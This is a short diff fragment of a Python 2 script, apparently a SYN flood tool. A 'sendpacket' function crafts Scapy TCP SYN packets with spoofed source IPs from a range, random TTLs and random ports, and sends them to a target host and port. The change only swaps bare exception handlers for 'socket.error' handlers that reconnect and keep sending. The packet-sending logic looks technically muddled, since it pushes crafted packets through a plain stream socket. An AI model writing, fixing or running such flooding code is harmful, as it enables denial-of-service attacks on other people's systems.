@@ -30,7 +30,7 @@ def sendpacket(Ip_range, destinationnew, targetport, destination):
                        cntchecksum = cntchecksum + 1
              
                  
-             except:
+             except socket.error, e:
                  silva.close()
                  silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  silva.connect((destinationnew, targetport))
@@ -42,7 +42,7 @@ def sendpacket(Ip_range, destinationnew, targetport, destination):
                silva.send(bytes(IP(dst = str(destinationnew), src = str(sourceIP), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
                Ip_range.remove(sourceIP)
                print 'package sent'
-           except:         
+           except socket.error, e:         
                silva.close()
                silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                silva.connect((destinationnew, targetport))
